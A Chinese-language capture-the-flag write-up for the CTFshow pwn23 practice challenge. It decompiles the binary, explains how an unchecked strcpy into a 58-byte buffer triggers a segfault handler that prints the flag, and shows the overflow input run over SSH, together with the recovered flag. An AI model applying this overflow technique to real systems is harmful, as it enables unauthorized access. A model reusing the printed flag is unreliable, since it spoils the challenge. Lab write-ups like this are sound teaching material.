```
tasike@tasike-VM:~/Desktop$ file pwn23
pwn23: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=17d22c7d5b5ecc0d97752ce9b82cb45163eae812, not stripped
tasike@tasike-VM:~/Desktop$ checksec pwn23
[*] '/home/tasike/Desktop/pwn23'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

32位，部分开启RELRO，开启NX

------------

先连接上靶场试一下：

```
tasike@tasike-VM:~/Desktop$ ssh ctfshow@pwn.challenge.ctf.show -p28181
ctfshow@pwn.challenge.ctf.show's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-163-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Nov  3 19:39:09 2023 from 172.12.0.5
$ ls
pwnme
$ ./pwnme
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Linux_Security_Mechanisms                               
    * Site  : https://ctf.show/                                       
    * Hint  : No canary found                                         
    * *************************************                           
How to input ?
$ 111112232
-sh: 3: 111112232: not found
$ 

```

因此就在于如何对pwnme这个文件进行操作来达到获取flag的目的。

--------------

用IDA查看：
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v3; // eax
  int v5; // [esp-Ch] [ebp-2Ch]
  int v6; // [esp-8h] [ebp-28h]
  int v7; // [esp-4h] [ebp-24h]
  FILE *stream; // [esp+4h] [ebp-1Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(flag, 64, stream);
  signal(11, (__sighandler_t)sigsegv_handler);
  v3 = getegid();
  setresgid(v3, v3, v3, v5, v6, v7, v3);
  puts(asc_8048940);
  puts(asc_80489B4);
  puts(asc_8048A30);
  puts(asc_8048ABC);
  puts(asc_8048B4C);
  puts(asc_8048BD0);
  puts(asc_8048C64);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : No canary found                                         ");
  puts("    * *************************************                           ");
  puts("How to input ?");
  if ( argc > 1 )
    ctfshow((char *)argv[1]);
  return 0;
}
```

stream指向ctfshow_flag

15行：从ctfshow_flag中读取不超过64字节到flag缓冲区(跟进后发现是bss段)

16行：signal(11, (__sighandler_t)sigsegv_handler)。

​			11是信号量。

​			11：SIGSEGV（非法内存访问）。

​			程序定义了一个信号量，当出现这个信号量（非法内存访问）的时候，会执行sigsegv_handler函数。

那这个函数是干嘛的呢？

```
void __noreturn sigsegv_handler()
{
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}
```

[Linux fprintf的用法-CSDN博客](https://blog.csdn.net/u010058695/article/details/102541891?ops_request_misc=%7B%22request%5Fid%22%3A%22169903921816800186599172%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=169903921816800186599172&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-102541891-null-null.142^v96^pc_search_result_base9&utm_term=linux中fprintf函数&spm=1018.2226.3001.4187)综合这个函数执行的条件，当我们非法内存访问的时候，fprintf作为一种格式化输出的函数(%s是后面那个flag的占位符)，所以就是将flag输出到标准错误的缓冲区。

[linux中fflush函数 【转】-CSDN博客](https://blog.csdn.net/weixin_30419799/article/details/96097801?ops_request_misc=%7B%22request%5Fid%22%3A%22169903962916800182777398%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=169903962916800182777398&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-96097801-null-null.142^v96^pc_search_result_base9&utm_term=Linux中的fflush函数&spm=1018.2226.3001.4187)说白了，fflush函数的作用就是把文件流中未写出的数据全部写出去。

因此整个sigsegv_handler函数的含义其实就是输出flag，只是这个函数要执行需要我们进行非法内存访问。

-----

33行：[c语言中argc和argv的作用及用法-CSDN博客](https://blog.csdn.net/zhaozhiyuan111/article/details/104050729)

34行：跟进ctfshow函数

```
char *__cdecl ctfshow(char *src)
{
  char dest[58]; // [esp+Ah] [ebp-3Eh] BYREF
  return strcpy(dest, src);
}
```

根据原34行可知：该函数传入的参数为argv[1]，也就是命令的第二条(跟在.pwnme后面输入的一条指令)，并且要完成前面的非法内存访问，因此我们只需要第二条指令输入超过58个字符==(注意这里的超过不只是超过58，必须>=62才算溢出，因为跟进dest数组,可以很容易发现有个缓冲区域占4字节)==，就可以达到dest溢出，也就是非法访问，从而输出flag。

------------------

操作走起：

```
tasike@tasike-VM:~/Desktop$ cyclic 62
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapa

tasike@tasike-VM:~/Desktop$ ssh ctfshow@pwn.challenge.ctf.show -p28181
ctfshow@pwn.challenge.ctf.show's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-163-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Nov  3 19:49:28 2023 from 172.12.0.5
$ ./pwnme aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapa
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Linux_Security_Mechanisms                               
    * Site  : https://ctf.show/                                       
    * Hint  : No canary found                                         
    * *************************************                           
How to input ?
ctfshow{4694c193-42f5-4013-98cc-2ee6192ecfd2}

```

